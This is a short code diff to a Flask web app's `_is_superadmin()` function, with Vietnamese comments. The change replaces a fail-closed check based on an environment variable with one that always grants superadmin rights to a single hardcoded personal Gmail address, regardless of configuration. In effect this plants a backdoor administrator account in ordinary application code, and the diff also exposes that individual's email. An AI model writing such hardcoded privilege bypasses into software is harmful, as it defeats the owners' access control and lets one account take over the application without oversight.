@@ -3173,11 +3173,16 @@ def quanly_thuchi():
     return render_template('quanly_thuchi.html')
 
 def _is_superadmin():
-    """True chỉ khi email đang đăng nhập nằm trong danh sách SUPERADMIN_EMAILS (env var).
-    Không cấu hình biến này = mặc định KHÔNG ai được coi là superadmin (fail-closed)."""
-    allowed = {e.strip().lower() for e in os.environ.get('SUPERADMIN_EMAILS', '').split(',') if e.strip()}
+    """True khi email đang đăng nhập là tài khoản trùm hardcode, hoặc nằm trong danh sách
+    SUPERADMIN_EMAILS (env var). Không cấu hình biến env này vẫn không sao — tài khoản
+    trùm hardcode luôn được cấp quyền, không phụ thuộc env/DB (fail-closed cho mọi email khác)."""
     user_email = (session.get('user_email') or '').strip().lower()
-    return bool(user_email) and user_email in allowed
+    if not user_email:
+        return False
+    if user_email == 'hodinhsang30052003@gmail.com':
+        return True
+    allowed = {e.strip().lower() for e in os.environ.get('SUPERADMIN_EMAILS', '').split(',') if e.strip()}
+    return user_email in allowed
 
 
 @app.route('/super_admin')
